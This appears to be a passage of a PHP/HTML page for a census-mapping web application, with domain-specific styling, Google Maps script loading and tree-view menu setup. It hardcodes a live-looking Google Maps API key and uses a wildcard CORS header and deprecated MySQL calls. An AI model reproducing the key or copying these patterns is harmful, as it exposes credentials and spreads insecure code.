<?php

        	//--Cabeceras
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
$method = $_SERVER['REQUEST_METHOD'];
if($method == "OPTIONS") {
    die();
}


include ( "functions.php" );
     
  actualizaBaseDeDatos();
  $arbol = treeview();
  $miscompras = mis_compras ( ( isset ( $_REQUEST [ 'MCompras' ] ) ? $_REQUEST [ 'MCompras' ] : '' ) );
  $zonas_administrar = zonas_admin();
  // @Isra
  $mqconf = mysql_query ( 'SELECT poligonoCircular,chat,popup,reporte FROM config;' ) ;
  $sconfig = @mysql_fetch_assoc ( $mqconf );
  $iconfig ['popup'] = $sconfig['popup'];
  $iconfig ['chat'] = $sconfig['chat'];
  $iconfig ['pcirc']= $sconfig['poligonoCircular'];

  $dominio = $_SERVER["HTTP_HOST"];
  
  $dominio = substr( $dominio, 0, strpos( $dominio, '.' ) );

  panelControl ( '', 1, '' );
  

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
    <head>


        <!-- <META HTTP-EQUIV="REFRESH" CONTENT="5" /> -->
        <META HTTP-EQUIV="EXPIRES" CONTENT="0"></META>
        <link rel="shortcut icon" href="imagenes/favIcon.png">
      <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@500&display=swap" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@500;900&display=swap" rel="stylesheet">
        <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE"></META>
        
        


<style>
<?php
    $dominio = $_SERVER["HTTP_HOST"];

	$dominio = substr( $dominio, 0, strpos( $dominio, '.' ) );
    if($dominio=='censosmkd'){
        echo '
        #cont_opciones{
            border-radius:20px;
            background: beige !important;
            border:none !important;
            font-family: "Roboto Slab", serif;
            font-weight: 900;
        }
        #main_opc{
            border-top-left-radius:20px;
            border-top-right-radius:20px;
            background:#6fbf60 !important;
        }
        body{
            background: linear-gradient(91deg, rgb(255, 247, 247), rgb(208, 209, 208), rgb(238, 251, 239));
        }
        h2{
            font-weight: 900 !important;
            border:none !important;
        }
        .ui-accordion-content{
            border-bottom-right-radius:20px !important;
            border-bottom-left-radius:20px !important;
            border: none !important;
        }
        .level1-li{
            z-index:5;
        }
        .level1-li:hover{
            background:linear-gradient(58deg, #4CAF50, #86ff8b );
        }
        .level1-a:hover > img {
            border-radius:20px;
            transition:1s;
            transform:rotateY(360deg);
        }
        .level2{
            background:#6fbf60 !important;
        }
        #buscar{
            border-radius:20px;
            border:none !important;
            background:linear-gradient(58deg, #4CAF50, #86ff8b ) !important;
        }
        #address{
            border-radius:20px;
            border:none !important;
            outline:none;
        }
        #radioDefault{
            border-radius:20px;
        }
        #radio{
            border-radius:20px;
        }
        .ui-widget{
            border-radius:20px !important;
        }
        .ui-widget-header{
            border-top-left-radius:20px !important;
            border-top-right-radius:20px !important;
            background: #6fbf60 !important;
        }
        #mostrarAgebs2NSE{
            display:none;
        }
        #mostrarAgebsLNSE{
            display:none;
        }
        #otroUsuario{
            border-radius:20px;
        }
        
        #MCompras{
            border-radius:20px;
        }
        #divCompra2{
            background-color: #6fbf60;
            border-radius: 20px;
        }
        .contenedorM{
            width:100%;
            height:400px;
            border-radius:20px;
            position:absolute;
            background-color:beige;
            bottom: -45px;
            display:flex;
            flex-direction:column;
            justify-content:center;
            text-align:center;
            font-size:30px;
        }
        .contB{
            width:70%;
            display:flex;
            flex-direction: column;
        }
        .p1{
            position:absolute;
            top:-50px;
            left:0;
            background-color:beige;
            border-radius:20px;
            padding:10px;
            cursor:pointer;
        }
        .p2{
            position:absolute;
            top:-50px;
            left:270px;
            background-color:#6fbf60;
            border-radius:20px;
            padding:10px;
            cursor:pointer;
        }
        .p3{
            position: absolute;
            top: -50px;
            right: 0px;
            background-color: #8BC34A;
            border-radius: 20px;
            padding: 10px;
            color: #fff;
            cursor: pointer;
            font-size: 25px;
            display: flex;
            align-items: center;
            flex-direction: column;
        }
        .divRadio{
            margin-left: 15px;
            margin-top: 20px;
        }
        .btn{
            padding: 10px;
            font-size: 30px;
            border-radius:20px;
        }   
        .menuMobile{
            width: 60vw;
            display: flex;
            position: relative;
            background: linear-gradient(103deg, #fff, #eee, #e5efe3);
            z-index: 3;
            top: 49px;
            flex-direction:column;
            display:none;
            border-bottom-right-radius:50px;
            border: 1px solid #0f7304;
        }
        .btnM{
            text-align:center;
            width:100%;
            border-bottom:1px solid #0f7304;
            font-size: 50px;
            display: flex;
        }
        
        .contSub{
            width: 40vw;
            display: flex;
            position: absolute;
            background: linear-gradient(103deg, #e5efe3, #eee, #fff);
            z-index: 3;
            top: 112px;
            left:60vw;
            flex-direction:column;
            display:none;
        }
         .contSub2{
            width: 40vw;
            display: flex;
            position: absolute;
            background: linear-gradient(103deg, #e5efe3, #eee, #fff);
            z-index: 3;
            top: 112px;
            left:60vw;
            flex-direction:column;
            display:none;
        }
        .bMM{
            position:absolute;
            height:100%;
            left:10px;
            border:none;
            outline:none;
            background-color:#fff0
        }
        .ih::after{
            content:"";
            width:50%;
            height:100%;
            background-color:#f00;
        }
        .bRegresar{
            display:flex;
            flex-direction: column;
            border: none;
            background-color: #fff0;
            position: absolute;
            bottom: 0;
            text-align: center;
            justify-content: center;
            font-size: 20px;
            left: 20px;
            background-color: #6fbf60;
            border-radius: 20px;
            width: 150px;
            color: #fff;
        }
        .bCotizar{
            display:flex;
            flex-direction: column;
            border: none;
            background-color: #fff0;
            position: absolute;
            bottom: 0;
            text-align: center;
            justify-content: center;
            font-size: 20px;
            right: 20px;
            background-color: #6fbf60;
            border-radius: 20px;
            width: 150px;
            color: #fff;
        }
        .dynatree-expander{
            scale: 1.5;
            margin-right: 35px;
        }
        .triangulo{
            width: 0px;
            height: 0px;
            position: absolute;
            border-left: 100px solid #0f7304;
            border-top: 50px solid transparent;
            border-bottom: 50px solid transparent;
            top: 25px;
            z-index: -1;
        }
        .triangulo::after{
            content: "";
            width: 0;
            height: 0;
            border-top: 40px solid transparent;
            border-left: 90px solid #86c441;
            position: absolute;
            display: inline-block;
            right: -70px;
            border-bottom: 40px solid transparent;
            margin-right: 50px;
            top: -19px;
            z-index: -1;
        }
        .btnM:last-child{
            border-bottom-right-radius:50px;
        }
        .contBusq{
            position: absolute;
            margin: auto;
            width: 40vw;
            top: 10px;
            left: 150px;
        }
        .buscadorM{
            font-size: 30px;
            padding: 23px;
        }
        .botBusq{
            height: 50px;
            position: absolute;
            top: 14px;
            right: 0;
        }
        .contCompras{
            width: 100%;
            height: 500px;
            border-radius: 20px;
            position: absolute;
            background-color: #e0f5b3;
            bottom: -45px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-size: 30px;
        }
        @media (max-width: 900px) {
          .ui-widget{
            transform:scale(1.5);   
          }
        }
        ';   
    }
?>
      html, body{
        height:100%;
        margin: 0px;
      }
      #mapa{
        width:100%;
        height:100%;
        margin: 0;
        padding: 0;
        position: relative;
      }
       #canvas{
        width:100%;
        height:100%;
        margin: 0;
        padding: 0;
        position: relative;
      }
      
      
</style>




<!--<script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBo6II7741K993JiG5r3saP8gw960OTTZk&libraries=places&callback=initAutocomplete&callback=initMap" type="text/javascript"></script>-->
<script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBo6II7741K993JiG5r3saP8gw960OTTZk&libraries=places&callback=initAutocomplete&callback=inicializa" type="text/javascript"></script>

<!-- Custom styles for this template -->

<!-- Captura de pantalla -->
<!--<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js"></script>-->
<!--	<script type="text/javascript" src="temas/default/reporteFa/js/html2canvas.min.js"></script>-->
 <!--   <script type="text/javascript" src="temas/default/reporteFa/js/canvas2image.js"></script>-->

        <link rel="stylesheet" href="cssmenu/stylesmetro.css">
   <script src="https://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
   <script src="cssmenu/scriptmetro.js"></script>
   <script src="main.1.7.js"></script>


<!--<script type="text/javascript" src="https://faprueba.censosmkd.com/temas/default/js/cssrefresh.js"></script>-->
<script type="text/javascript" src="https://faprueba.censosmkd.com/temas/default/js/kmls.js"></script>
<!--<script type="text/javascript" src="https://elecciones.censosmkd.com/temas/default/js/elecciones.js"></script> -->
<!--<script type="text/javascript" src="https://elecciones.censosmkd.com/temas/default/js/distritos.js"></script>-->
<script type="text/javascript" src="https://fa1.censosmkd.com/temas/default/js/pintakml.js"></script> 
<script type="text/javascript" src="https://fa1.censosmkd.com/temas/default/js/pintakml2.js"></script>
<script type="text/javascript" src="https://fa1.censosmkd.com/temas/default/js/pintaNSE.js"></script> 
<script type="text/javascript" src="https://desarrollosdelta.censosmkd.com/temas/default/js/pintaPoliDelta.js"></script>
                 <!-- <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?v=3?sensor=false"> --></script>
                 
<!-- INICIO -- Agregamos Fancybox para fotos y paginas popup -->    
  <!-- Add mousewheel plugin (this is optional) -->
  <script type="text/javascript" src="temas/default/fancybox/js/ampliar/jquery.mousewheel-3.0.6.pack.js"></script>

  <!-- Add fancyBox main JS and CSS files -->
  <script type="text/javascript" src="temas/default/fancybox/js/ampliar/jquery.fancybox.js"></script>
  <link rel="stylesheet" type="text/css" href="temas/default/fancybox/css/ampliar/jquery.fancybox.css" media="screen" />

  <!-- Add Button helper (this is optional) -->
  <link rel="stylesheet" type="text/css" href="temas/default/fancybox/css/ampliar/jquery.fancybox-buttons.css?v=2.0.3" />
  <script type="text/javascript" src="temas/default/fancybox/js/ampliar/jquery.fancybox-buttons.js?v=2.0.3"></script>

  <!-- Add Thumbnail helper (this is optional) -->
  <link rel="stylesheet" type="text/css" href="temas/default/fancybox/css/ampliar/jquery.fancybox-thumbs.css?v=2.0.3" />
  <script type="text/javascript" src="temas/default/fancybox/js/ampliar/jquery.fancybox-thumbs.js?v=2.0.3"></script>
  <!-- fin imagenes-->
 
 <!--Fancybox-->

  <script type="text/javascript" src="temas/default/fancybox/js/fancybox/lib/jquery.mousewheel-3.0.6.pack.js"></script>
  <link rel="stylesheet" href="temas/default/fancybox/js/fancybox/source/jquery.fancybox.css?v=2.1.5" type="text/css" media="screen" />
  <script type="text/javascript" src="temas/default/fancybox/js/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  <link rel="stylesheet" href="temas/default/fancybox/js/fancybox/source/helpers/jquery.fancybox-buttons.css?v=1.0.5" type="text/css" media="screen" />
  <script type="text/javascript" src="temas/default/fancybox/js/fancybox/source/helpers/jquery.fancybox-buttons.js?v=1.0.5"></script>
  <script type="text/javascript" src="temas/default/fancybox/js/fancybox/source/helpers/jquery.fancybox-media.js?v=1.0.6"></script>
  <link rel="stylesheet" href="temas/default/fancybox/js/fancybox/source/helpers/jquery.fancybox-thumbs.css?v=1.0.7" type="text/css" media="screen" />
  <script type="text/javascript" src="temas/default/fancybox/js/fancybox/source/helpers/jquery.fancybox-thumbs.js?v=1.0.7"></script>
 
                 
                 
 
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/google.maps.Polygon.contains.js"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/jOverviewMapControlV3.js"></script>' . "\n"; ?>

   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
        <title>CensosMKD :: P&aacute;gina Principal</title>

        <?php echo '<link href="' . DIR_TEMA_ACTIVO . 'css/main1.0.css" rel="stylesheet" type="text/css" />' . "\n"; ?>
        <!--@Isra-->
        <?php
        if ($dominio=='fa1' or $dominio=='faprueba')
    {
           echo '<link href="' . DIR_TEMA_ACTIVO . 'css/principal1.0fa.css" rel="stylesheet" type="text/css" />' . "\n";
           echo '<link rel="stylesheet" href="' . DIR_TEMA_ACTIVO . 'css/main_menu1.1fa.css" type="text/css" />' . "\n";
             echo '<link type="text/css" href="' . DIR_TEMA_ACTIVO . 'css/jquery-ui-1.8.10.customfa.css" rel="stylesheet" />' . "\n";
    }else
         if ($dominio=='faprueba')
    {
           echo '<link href="' . DIR_TEMA_ACTIVO . 'css/principal1.0fa.css" rel="stylesheet" type="text/css" />' . "\n";
           echo '<link rel="stylesheet" href="' . DIR_TEMA_ACTIVO . 'css/main_menu1.1fa.css" type="text/css" />' . "\n";
             echo '<link type="text/css" href="' . DIR_TEMA_ACTIVO . 'css/jquery-ui-1.8.10.customfa.css" rel="stylesheet" />' . "\n";
             echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/func.google.maps.1.11_V2.js"></script>' . "\n";
             echo '<script async defer type="text/javascript" src="https://maps.googleapis.com/maps/api/js?signed_in=true&callback=centraMapa"></script>';
    }else
        {
        if ($dominio=='demo1')
        {
               echo '<link href="' . DIR_TEMA_ACTIVO . 'css/principal1.0ma.css" rel="stylesheet" type="text/css" />' . "\n";
             echo '<link rel="stylesheet" href="' . DIR_TEMA_ACTIVO . 'css/main_menu1.1ma.css" type="text/css" />' . "\n";
             echo '<link type="text/css" href="' . DIR_TEMA_ACTIVO . 'css/jquery-ui-1.8.10.custom.ma.css" rel="stylesheet" />' . "\n";
          }
            else{
               if ($dominio=='holcimmx' or $dominio=='materiales')
               {
                echo '<link href="' . DIR_TEMA_ACTIVO . 'css/principal1.0Holcim.css" rel="stylesheet" type="text/css" />' . "\n";
                echo '<link rel="stylesheet" href="' . DIR_TEMA_ACTIVO . 'css/main_menu1.1Holcim.css" type="text/css" />' . "\n";
                echo '<link type="text/css" href="' . DIR_TEMA_ACTIVO . 'css/jquery-ui-1.8.10.custom-holcim.css" rel="stylesheet" />' . "\n";
             }
            else
            {
                 echo '<link href="' . DIR_TEMA_ACTIVO . 'css/principal1.0.css" rel="stylesheet" type="text/css" />' . "\n";
                   echo '<link rel="stylesheet" href="' . DIR_TEMA_ACTIVO . 'css/main_menu1.1.css" type="text/css" />' . "\n";
                 echo '<link type="text/css" href="' . DIR_TEMA_ACTIVO . 'css/jquery-ui-1.8.10.custom.css" rel="stylesheet" />' . "\n";
            }
         }
    }
        ?>



        <!--  <script type="text/javascript" src="js/jquery-1.5.js"></script> -->
        <!--  <script type="text/javascript" src="js/jquery-ui-1.8.10.custom.min.js"></script>  -->
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/jquery-1.7.2.min.js"></script>' . "\n"; ?>

        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/jquery-ui-1.8.19.custom.min.js"></script>' . "\n"; ?>

        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/markerclusterer.js"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/progressBar.js"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/maplabel.js"></script>' . "\n"; ?>
        <script type="text/javascript" src="tree/jquery-ui.custom.js"></script>
        <script type="text/javascript" src="tree/jquery.cookie.js"></script>
<!-- Se agrega nuevo alert -->
<link href="temas/default/css/colorAlert.css" rel="stylesheet">

        <link href="tree/ui.dynatree.css" rel="stylesheet" type="text/css" id="skinSheet" />
    <script src="tree/jquery.dynatree.js" type="text/javascript"></script>

        <?php echo '<link rel="stylesheet" type="text/css" href="' . DIR_TEMA_ACTIVO . 'css/smallColorPicker.css" />' . "\n"; ?>
        <?php echo '<script src="' . DIR_TEMA_ACTIVO . 'js/jquery.smallColorPicker.js"  type="text/javascript"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript">var DIR_TEMA_ACTIVO = \'' . DIR_TEMA_ACTIVO . '\';</script>'; ?>
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/func.google.maps.1.11.js"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/functionsmain.1.5.js"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/validaciones1.1.js"></script>' . "\n"; ?>
        <?php echo '<script type="text/javascript" src="temas/default/js/main.1.7.js"></script>' . "\n"; ?>
           <?php echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/coexito.js"></script>' . "\n"; ?>
       <?php if ($dominio=='faprueba') 
       echo '<script type="text/javascript" src="' . DIR_TEMA_ACTIVO . 'js/func.google.maps.1.11_V2.js"></script>' . "\n"; ?>
   <style>


#floating-panel {
  position: absolute;
  top: 150px;
  left: 176px;
  z-index: 5;
  text-align: center;
  font-family: 'Roboto','sans-serif';
  width: 50px;
  /*height: 148px;*/
  height: 148px;
  background-color: rgba(230,0,0, 0.7);
}
#floating-panel2 {
  position: absolute;
  top: 308px;
  left: 176px;
  z-index: 5;
  background: rgba(153,153,153, 0.7);
  text-align: center;
  font-family: 'Roboto','sans-serif';
  width: 97px;
  height: 221px;
}

index
         </style>
<style type="text/css">
div.boxContenedor{
    height: 250px;
    width: 250px;
    overflow-y: scroll;
}
div.boxContenedor_consultas{
    height: 180px;
    width: 270px;
    overflow-y: scroll;
}
div.boxContenedor_consultas2{
    overflow-y: scroll;
}


</style>
        <script type="text/javascript" language="javascript" src="ajax.js"></script>


<?php $dominio = $_SERVER["HTTP_HOST"];
$dominio = substr( $dominio, 0, strpos( $dominio, '.' ) );
global $contenido_main;
if($dominio=='censosmkd'){
    echo '<script type="text/javascript">
                    var raicesCargadas=false;
          //@Isra
                   var dominio = " <?php echo $dominio ?>";

                    function inicia() {
                        $("#accordion").accordion({
                            change: function(event, ui) {
                                if(ui.newHeader.index()==0) {
                                    if (consultaGratuita) {
                                        ayuda("20");
                                        tipoPoligono="curculo";
                                        $("#accordion").accordion("activate",1);
                                        //window.location = "login.html";
                                    }else
                                        tipoPoligono="poligono";
                                }else
                                   tipoPoligono="circulo";
                              ActivaPoligono("1");
                          }
                      });

                      $("#address").keypress(function(event) {
                        if ( event.which == 13 ) {
                           event.preventDefault();
                           codeAddress("15");
                           Cerra_buscar();
                         }
                      });

                        //alert(3);
                        inicializa();
                        carga();


gastubo();




          //@Isra';
}else{
    echo '<script type="text/javascript">
                    var raicesCargadas=false;
          //@Isra
                   var dominio = " <?php echo $dominio ?>";

                    function inicia() {
                        $("#accordion").accordion({
                            change: function(event, ui) {
                                if(ui.newHeader.index()==0) {
                                    if (consultaGratuita) {
                                        alert ("No es posible definir pol&iacute;gonos irregulares en consultas b&aacute;sicas!");
                                        tipoPoligono="curculo";
                                        $("#accordion").accordion("activate",1);
                                        window.location = "login.php";
                                    }else
                                        tipoPoligono="poligono";
                                }else
                                   tipoPoligono="circulo";
                              ActivaPoligono("1");
                          }
                      });

                      $("#address").keypress(function(event) {
                        if ( event.which == 13 ) {
                           event.preventDefault();
                           codeAddress("15");
                           Cerra_buscar();
                         }
                      });

                        //alert(3);
                        inicializa();
                        carga();


gastubo();




          //@Isra';
}
?>
    


                        <?php

$cad1x ='\'9\' ';
if ($iconfig['popup'] == '1')
                          {
                          ?>

                  <?php
                  }

                   ?>







                        //alert(4);

                        $('#menuNVO li').hover(function(){
                                          //alert($(this).find('ul:first'));
                                          $(this).find('ul:first').css({visibility: "visible",display: "block"});
                                                  //$(this).find('ul:first').css({visibility: "visible",display: "none"}).fadeIn(400); // effect 1
                                               },
                                               function(){
                                                  $(this).find('ul:first').css({visibility: "hidden"});
                                               });

                        <?php
                                global $arbol;
                                echo $miscompras[0];
                                echo $arbol;
                                echo zonas_mostrar_arbol();
                                echo ver_preguntas ( '1' );
                        ?>
                                $( "#tree3" ).dynatree({
                                                       checkbox: true,
                                                       selectMode: 3,
                                                       //children: treeData,
                                                       initAjax: {url: "mapa.php?tipo=treeviewJSON",
                                              data: {key: "-1", // Optional arguments to append to the url
                                                       mode: "all"
                                                      }
                                             },
                                         onLazyRead: function(node){
                                            node.appendAjax({url: "mapa.php?tipo=treeviewJSON",
                                                             data: {"key": node.data.key, // Optional url arguments
                                                                    "mode": "all"
                                                                   },
                                                             success: function(node) {
                                                                   }
                                                             });
                                                   },
                                        onPostInit: function(isReloading, isError){
                                                   },
                                                       onSelect: function ( select, node ){
                                                        var selKeys = $.map ( node.tree.getSelectedNodes(),
                                                                              function ( node ){
                                                                                r = node.data.key;
                                                                                if (( r.indexOf ( '_' ) > -1 ) || (r.indexOf('|') == -1)){
                                                                                    r = null;
                                                                                }
                                                                                return r;
                                                                                });
                                                        $( '#seleccion' ).text ( selKeys + '' );
                                                          borra_puntos_compra(false);
                                                          activar_compra_gratis();
                                                       },
                                                       onDblClick: function ( node, event ){
                                                       node.toggleSelect();
                                                       },
                                                       onKeydown: function(node, event){
                                                       if ( event.which == 32 ){
                                                       node.toggleSelect();
                                                       return false;
                                                       }
                                                       },
                                                       // The following options are only required, if we have more than one tree on one page:
                                                       //       initId: "treeData",
                                                       cookieId: "dynatree-Cb3",
                                                       idPrefix: "dynatree-Cb3-"
                                                       });
                                $( "#zonastree" ).dynatree({
                                                           checkbox: true,
                                                           selectMode: 3,
                                                           children: treezonas_view,
                                                           onSelect: function ( select, node ){
                                                           var selKeys = $.map ( node.tree.getSelectedNodes(), function ( node ){
                                                                                r = node.data.key;
                                                                                if ( r.indexOf ( '_' ) > -1 ){
                                                                                r = null;
                                                                                }
                                                                                return r;
                                                                                });
                                                           $( '#seleccion_zonastree' ).text ( selKeys + '' );
                                                           zonas(true);

                                                           },
                                                           onDblClick: function ( node, event ){
                                                           node.toggleSelect();
                                                           },
                                                           onKeydown: function ( node, event ){
                                                           if ( event.which == 32 ) {
                                                           node.toggleSelect();
                                                           return false;
                                                           }
                                                           },
                                                           cookieId: "dynatree-Cb3-zonastree",
                                                           idPrefix: "dynatree-Cb3-zonastree"
                                                           });
                                $( "#paso2" ).css ( 'display','none' );
                                $( "#paso1" ).fadeIn ( 'slow' );

                                <?php
                                echo $zonas_administrar[0];
                                ?>
                                <?php
                                if ( isset ( $_REQUEST [ 'MCompras' ] ) ){
                                ?>
                                opciones_miscompras ();
                                <?php
                                }
                                ?>
                    }

                    function enviaForma() {
                      $('#formaCompras').submit();
                    }
                    function enviaFormaAdmin() {
                      $('#formaComprasAdmin').submit();
                    }
                    </script>

<!--<script type="text/javascript" >
function mostrarKML(){  
  //inicializar_mapa();
  console.log("Entra");

  var ppt = 0;
  var kml_mex = "";

  console.log("p2");
    for (i = 1; i <= 2; i++) {
        if (document.getElementById('kml' + i).checked) {
            kml_mex = kml_mex + "\'" + document.getElementById("kml" + i).value + "\'";
            ppt = "2";
            //console.log(kml_mex);
            //alert (kml_mex);

            }


        }
    

console.log("ppt");
console.log(ppt);

 if (ppt == "2"){
        console.log("Vamos a mandar los datos");
        $.ajax({
            type: "POST",
            url: "kml.php",
            data: 'type=muestrakml&kml_mex=' + kml_mex,
            success: function(data) {
                console.log(data);
            }
        });
}

}
console.log("Sale");
</script>  -->

  <!-- ************************** -->
  <!-- Inicio Iframe Reporte FA -->
  <!-- @Rafael -->
  <!--<script type="text/javascript">
  $(document).ready(function() {
    $(".various").fancybox({
      maxWidth  : 5000,
      maxHeight : 1000,
      fitToView : false,
      width   : '100%',
      height    : '100%',
      autoSize  : false,
      closeClick  : false,
      openEffect  : 'none',
      closeEffect : 'none'
    });
  });
  </script>-->
  <!-- Fin Iframe Reporte FA -->


                </head>
    <body>
        
<script language=javascript> 
function ventanaSecundaria (URL){ 
   window.open("https://www.desarrolloweb.com","ventana1","width=120,height=300,scrollbars=NO") 
} 
</script> 
          <?php include_once("analyticstracking.php") ?>

        <?php
            if ( isset ( $_SESSION['user'] ) ){
        $der = derechos ( $_SESSION [ 'user' ], 27 );
          if( in_array( 'Agregar', $der ) ){
            echo '<div class="popUpMenu" id="popUpMenu" style="display:none; position:absolute; z-index:9999;" >
                <ul>
                  <li onclick="mostrar_ventana_add_puntos(clickLatitud, clickLongitud);"><a>Agregar Punto</a></li>
                </ul>
                </div>';
            echo "<script type=\"text/javascript\">
                function modificaMarker( m ){
                  m.setDraggable(true);
                }
                function markerEndDrag( marker, event ){
                  var id = marker.getTitle().split('|');
                    if( confirm('¿Cambiar las coordenadas de ' + id[0] + '?' ) ){
                      $.ajax({
                      type: 'POST',
                      url: 'mapa.php',
                      data:'tipo=posicion_punto&idpunto=' + id[1] + '&lat=' + event.latLng.lat() + '&lng=' + event.latLng.lng(),
                      success: function(data){
                        if ( data == -1 ){
                          alert ( 'Su sesi&oacute;n a expirado');
                          window.location = 'logout.php';
                        }else{
                          alert ( data );
                        }
                      }
                      });
                    }else{
                      marker.setPosition( new google.maps.LatLng ( iniLat, iniLng ) );


                    }
                }
                </script>";
          }else{
            echo '<script type="text/javascript">
                function modificaMarker( m ){ }
                function markerEndDrag( marker, event ){ }
                </script>';
          }
      }else{
        echo '<script type="text/javascript">
            function modificaMarker( m ){ }
            function markerEndDrag( marker, event ){ }
            </script>';
      }
        ?>
        

        <?php
                            if($dominio=='faprueba'){

echo "<marquee>Este sitio es de pruebas, constantemente se esta actualizando. ¡Disculpe las molestias!</marquee>";
                            } 
                            ?>
        <div id="contenedor_principal">
            <div id="encabezado">
                
        <img id="encabezado_izquierda" src=<?php  if ($dominio=='metrored'or $dominio=='fa1'or $dominio=='faprueba'or $dominio=='seguros' or $dominio=='holcimmx' or $dominio=='materiales' or $dominio=='ipeth' or $dominio=='proteinas') {echo '"' . DIR_TEMA_ACTIVO . '_img/logo_'.$dominio.'_Menu.gif"';}
         if ($dominio=='demo1') {echo '"' . DIR_TEMA_ACTIVO . '_img/logo_'.$dominio.'_Menu.png"';}
        else {echo '"' . DIR_TEMA_ACTIVO . '_img/logoMenu.png"';} ?> alt="Logo Menu" height="60" />
                <div id="encabezado_center">
                    <?php
            if($dominio=='censosmkd'){
        ?>
            <a href="https://censosmkd.com/design_censosMKD/" >
				    <MARQUEE BEHAVIOR=alternate WIDTH=100% BGCOLOR=#7dc33a style="padding: 1px 1px 5px 1px">
		                <FONT  COLOR=#fff SIZE=5>
                            Visita nuestro nuevo sitio. Da clic aquí. 
                        </FONT>
                
                    </MARQUEE>
                   </a>
        <?php
            } 
        ?>
                    <div id="menu">
                    </div>
            <img id="encabezado_derecha" src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/inegi.png"'; ?> alt="inegi" height="42" width="221" />
             <div id="floating-panel"  style="display:none;">
                        <a onclick="abrir2();" title="Resultados">  <img src="temas/default/_img/fa1agebs.png" width="30" height="39" /></a>
                           <HR color="#FFFFFF" >
                        <a onclick="abrir();" title="Listado">  <img src="temas/default/_img/fa1lista.png" width="30" height="39" /></a>
                           <HR color="#FFFFFF" >
                     <a onclick="Divregla();" title="Distancia">
                          <img src="temas/default/_img/fa1regla.png" width="30" height="39" id="regla"/>                          </a>
                         <HR color="#FFFFFF" >
                    
                          <!--
                         //<?php 
                         //if($_SESSION['user'] == 'Admin' or $_SESSION['user'] == 'rafael' or $_SESSION['user'] == 'reportes' or $_SESSION['user'] == 'reporte1' or $_SESSION['user'] == 'reporte2'){
                         ?>
                         
                       
                        <button id="btnCapturar" onclick="tomarCaptura();" style="text-decoration: none; padding: 5px; font-weight: 600; font-size: 15px; color: #FFFFFF; background-color: rgba(230,0,0, 0.7); border-radius: 6px; border: 2px solid rgba(230,0,0, 0.7);">Mapa 1</button>
                       
                           <HR color="#FFFFFF" >
                       
                       <div id="div_canvas" style="display: none; background-color: rgba(255, 255, 255, 0.863); width: 100px;">
                           
                            <div id="div_boton2" style="display: none;">
                            <a onclick="" title="Cargando">  <img src="temas/default/_img/loading.gif" width="30" height="39" style="float:left;width: 50%;outline: white solid thin"/></a>
                            </div>
                            
                        </div>
                        <button id="btnCapturar2" onclick="tomarCaptura2();" style="text-decoration: none; padding: 5px; font-weight: 600; font-size: 15px; color: #FFFFFF; background-color: rgba(230,0,0, 0.7); border-radius: 6px; border: 2px solid rgba(230,0,0, 0.7);">Mapa 2</button>
                           <HR color="#FFFFFF" >
                       
                            <div id="div_canvas2" style="display: none; background-color: rgba(255, 255, 255, 0.863); width: 100px;">
                           
                                <div id="div_boton12" style="display: none;">
                                    <a onclick="guardarCaptura2();" title="guardar captura">  <img src="temas/default/_img/si.png" width="38" style="float:left;width: 50%;outline: white solid thin"/></a>
                                    <a onclick="cerrarCaptura2();" title="cerrar">  <img src="temas/default/_img/no.png" width="38" style="float:left;width: 50%;outline: white solid thin"/></a>
                                </div>
                                <div id="div_boton22" style="display: none;">
                                    <a onclick="" title="Cargando">  <img src="temas/default/_img/loading.gif" width="30" height="39" style="float:left;width: 50%;outline: white solid thin"/></a>
                                </div>
                                <canvas id="canvas2" style="border: 5px solid black; display: none;">
                                </canvas>
                            </div>
                            
                        <button id="btnCapturar3" onclick="tomarCaptura3();" style="text-decoration: none; padding: 5px; font-weight: 600; font-size: 15px; color: #FFFFFF; background-color: rgba(230,0,0, 0.7); border-radius: 6px; border: 2px solid rgba(230,0,0, 0.7);">Mapa 3</button>
                           <div id="div_canvas3" style="display: none; background-color: background-color: rgba(255, 255, 255, 0.863); width: 100px;; width: 100px;">
                           
                            <div id="div_boton13" style="display: none;">
                            <a onclick="guardarCaptura3();" title="guardar captura">  <img src="temas/default/_img/si.png" width="38" style="float:left;width: 50%;outline: white solid thin"/></a>
